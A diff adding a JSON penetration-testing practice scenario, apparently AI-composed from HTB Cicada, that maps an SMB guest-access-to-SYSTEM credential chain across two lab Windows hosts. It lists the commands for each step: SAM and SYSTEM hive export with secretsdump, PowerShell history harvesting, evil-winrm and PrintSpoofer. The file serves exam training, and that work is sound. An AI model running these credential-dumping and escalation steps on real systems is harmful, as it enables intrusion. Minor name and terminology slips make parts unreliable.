@@ -1,0 +1,207 @@
+{
+  "id": "smb-guest-to-admin",
+  "title": "SMB Guest to Admin",
+  "category": "service-drill",
+  "source": ["HTB Cicada", "Relia"],
+  "designed_by": "ai-composite",
+  "description": "SMB enumeration drill: Guest SMB → HR share → michael.wrightson password → RID brute → david.orelious → LDAP description → emily.oscars → Backup Operators → reg save → secretsdump. CICADA → FILES SMB password spray → PS transcript → admin creds → psexec.",
+
+  "introduction": "Teaches credential chaining via SMB shares and LDAP—a core OSCP pattern where one foothold unlocks multiple accounts.",
+  "mental_model": "Treat SMB as a credential pipeline: enumerate shares, harvest creds, then pivot each new account to discover more (RID brute, LDAP, password spray).",
+  "key_principles": [
+    "Always try guest/null SMB before brute-forcing",
+    "RID brute when you have one valid domain user",
+    "Check LDAP description fields for stored creds",
+    "Backup Operators can read SAM via reg save",
+    "Password spray laterally with every new credential"
+  ],
+
+  "indicators": {
+    "difficulty": 4,
+    "cognitive_load": 3,
+    "enumeration_depth": 4,
+    "rabbit_hole_risk": 3,
+    "time_pressure": 3
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006"],
+    "techniques": [
+      {"id": "T1087.002", "name": "Account Discovery: Domain Account"},
+      {"id": "T1552.001", "name": "Credentials In Files"},
+      {"id": "T1003.002", "name": "Security Account Manager"},
+      {"id": "T1021.002", "name": "SMB/Windows Admin Shares"},
+      {"id": "T1028", "name": "Windows Remote Management"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T3-NonWeb-Access", "T4b-Win-PrivEsc", "T5-Credentials", "T7-Lateral"],
+
+  "environment": {
+    "machine_count": 2,
+    "network_count": 1,
+    "os_distribution": {"windows": 2, "linux": 0},
+    "has_ad": true,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "smb", "guest", "rid-brute", "enum4linux", "impacket",
+    "secretsdump", "backup-operators", "registry", "ps-transcripts",
+    "password-spray", "psexec", "nxc"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17, 18],
+    "pattern_frequency": "high",
+    "recommended_order": 4
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.10.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "cicada",
+      "label": "CICADA",
+      "ip": "10.10.11.35",
+      "os": "Windows",
+      "role": "AD Member",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 445,
+          "name": "SMB",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "Guest SMB access to HR share", "leads_to": "michael-creds"}
+          ],
+          "commands": [
+            {"cmd": "smbclient -N -L //10.10.11.35", "rationale": "Why: Probe for guest-accessible shares without creds"},
+            "smbclient -N //10.10.11.35/HR",
+            "get passwords.txt",
+            "cat passwords.txt"
+          ]
+        },
+        {
+          "port": 389,
+          "name": "LDAP",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "info-disclosure", "summary": "LDAP description field contains emily.oscars creds", "leads_to": "backup-operators"}
+          ],
+          "commands": [
+            "nxc ldap 10.10.11.35 -u david.orelious -p '<password>' --users",
+            "ldapsearch -x -H ldap://10.10.11.35 -D 'david.orelious@corp.local' -w '<password>' -b 'dc=corp,dc=local'"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "emily.oscars",
+          "to": "SYSTEM",
+          "technique": "Backup Operators → reg save SAM/SYSTEM → secretsdump",
+          "commands": [
+            {"cmd": "reg save HKLM\\SAM c:\\windows\\temp\\sam.save", "rationale": "Why: Backup Operators can export SAM for offline cracking"},
+            "reg save HKLM\\SYSTEM c:\\windows\\temp\\sys.save",
+            {"cmd": "impacket-secretsdump -sam sam.save -system sys.save LOCAL", "rationale": "Why: Extract NTLM hashes from exported registry hives"}
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "michael.wrightson", "type": "password", "source": "HR share passwords.txt", "unlocks": ["rid-brute"]},
+        {"user": "david.orelious", "type": "password", "source": "RID brute with michael.orelious", "unlocks": ["ldap"]},
+        {"user": "emily.oscars", "type": "password", "source": "LDAP description field", "unlocks": ["cicada-backup"]}
+      ],
+      "alternatives": []
+    },
+    {
+      "id": "files",
+      "label": "FILES",
+      "ip": "10.10.10.21",
+      "os": "Windows",
+      "role": "File Server",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 445,
+          "name": "SMB",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "SMB password spray with emily.oscars", "leads_to": "admin-creds"}
+          ],
+          "commands": [
+            "nxc smb 10.10.10.21 -u emily.oscars -p '<password>' --shares",
+            "smbclient //10.10.10.21/Users -U emily.oscars",
+            {"cmd": "get 'admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'", "rationale": "Why: PS history often contains passwords and commands"}
+          ]
+        },
+        {
+          "port": 5985,
+          "name": "WinRM",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "WinRM with admin creds from transcripts", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "evil-winrm -i 10.10.10.21 -u admin -p '<password-from-transcript>'"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "admin",
+          "to": "SYSTEM",
+          "technique": "SeImpersonate → PrintSpoofer",
+          "commands": [
+            "whoami /priv",
+            {"cmd": "PrintSpoofer64.exe -i -c cmd", "rationale": "Why: SeImpersonate lets us steal SYSTEM token via named pipe"}
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "admin", "type": "password", "source": "PS transcript in Users share", "unlocks": ["files-admin"]}
+      ],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [
+    {
+      "from": "cicada",
+      "to": "files",
+      "technique": "SMB spray with emily.oscars",
+      "requires": "emily.oscars creds from CICADA LDAP description",
+      "pivot": false,
+      "path_ids": ["path-full"],
+      "commands": [
+        "nxc smb 10.10.10.21 -u emily.oscars -p '<password>' --shares",
+        "smbclient //10.10.10.21/Users -U emily.oscars",
+        "get 'admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'"
+      ]
+    }
+  ],
+
+  "attack_paths": [
+    {
+      "id": "path-full",
+      "name": "CICADA → FILES (credential chain)",
+      "color": "#6bb8cc",
+      "steps": ["cicada", "files"],
+      "description": "Guest SMB → HR share → michael.wrightson → RID brute → david.orelious → LDAP → emily.oscars → spray FILES → PS transcript → admin → PrintSpoofer"
+    },
+    {
+      "id": "path-cicada",
+      "name": "CICADA only: Backup Operators",
+      "color": "#e8a87c",
+      "steps": ["cicada"],
+      "description": "Guest SMB → emily.oscars → Backup Operators → reg save → secretsdump"
+    }
+  ]
+}
